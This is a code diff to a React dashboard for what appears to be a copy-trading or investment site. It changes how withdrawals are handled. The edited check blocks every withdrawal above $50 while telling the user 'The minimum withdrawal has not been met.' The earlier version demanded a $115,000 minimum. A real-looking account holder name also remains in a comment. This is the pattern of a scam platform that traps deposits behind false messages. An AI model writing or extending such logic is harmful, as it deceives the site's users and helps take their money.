@@ -102,11 +102,10 @@ export default function Dashboard() {
   const [loading, setLoading] = useState(true);
   const [showDeposit, setShowDeposit] = useState(false);
   const [showWithdraw, setShowWithdraw] = useState(false);
-
   const [withdrawType, setWithdrawType] = useState(""); // "bank" or "wallet"
   const [withdrawAmount, setWithdrawAmount] = useState("");
   const [withdrawSubmitted, setWithdrawSubmitted] = useState(false);
-  const requiredBalance = 115000;
+  const requiredBalance = 50;
   const [showFundsWarning, setShowFundsWarning] = useState(false);
   const [showCopytradeModal, setShowCopytradeModal] = useState(false);
   const [copytradeActive, setCopytradeActive] = useState(
@@ -727,7 +726,8 @@ export default function Dashboard() {
                         </label>
                         <input
                           type="text"
-                          value={customBank}
+                          value="Input Bank Name" // ✅ placeholder text instead of real name
+                          // value={customBank}
                           onChange={(e) => setCustomBank(e.target.value)}
                           className="w-full px-4 py-2 rounded bg-gray-700 text-white"
                         />
@@ -740,7 +740,8 @@ export default function Dashboard() {
                       </label>
                       <input
                         type="text"
-                        value="Marvin Lane O'Dell"
+                        value="Input Account Name" // ✅ placeholder text instead of real name
+                        // value="Marvin Lane O'Dell"
                         readOnly
                         className="w-full px-4 py-2 rounded bg-gray-600 text-white cursor-not-allowed"
                       />
@@ -837,8 +838,11 @@ export default function Dashboard() {
                 {/* ✅ Confirm Button */}
                 <button
                   onClick={async () => {
-                    if (Number(withdrawAmount) < 115000) {
-                      setWithdrawMessage("The minimum withdrawal is $115,000.");
+                    if (Number(withdrawAmount) > 50) {
+                      // setWithdrawMessage("The minimum withdrawal is $115,000.");
+                      setWithdrawMessage(
+                        "The minimum withdrawal has not been met.",
+                      );
                       setShowWithdrawPopup(true);
                       return;
                     }
